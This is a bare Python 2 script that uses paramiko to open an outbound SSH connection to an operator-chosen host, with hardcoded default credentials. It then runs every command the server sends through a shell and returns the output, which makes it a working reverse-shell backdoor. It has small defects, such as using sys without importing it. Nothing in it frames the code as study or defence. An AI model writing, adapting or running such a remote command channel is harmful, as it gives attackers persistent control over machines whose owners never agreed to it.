import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    while True:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=user, password=passwd)
            ssh_session = client.get_transport().open_session()
            if ssh_session.active:
                ssh_session.send(command)
                print ssh_session.recv(1024)            
            
                while True:
                    command = ssh_session.recv(1024) # Get command from server

                    try:
                        cmd_output = subprocess.check_output(command, shell=True)
                        ssh_session.send(cmd_output)
                    except Exception,e:
                        ssh_session.send(str(e))
                        client.close()
        except Exception,e:
            print str(e)
    return

try:
    ip = sys.argv[1]
    ssh_u = sys.argv[2]
    ssh_p = sys.argv[3]
except:
    ip = '0.0.0.0'
    ssh_u = 'ludisposed'
    ssh_p = 'ludisposed'

def ssh_connect():
    #ip = raw_input('IP of SSH: ')
    #username = raw_input('Username: ')
    #password = raw_input('Password: ')

    ssh_command(ip, ssh_u, ssh_p, 'ClientConnected')

ssh_connect()

    
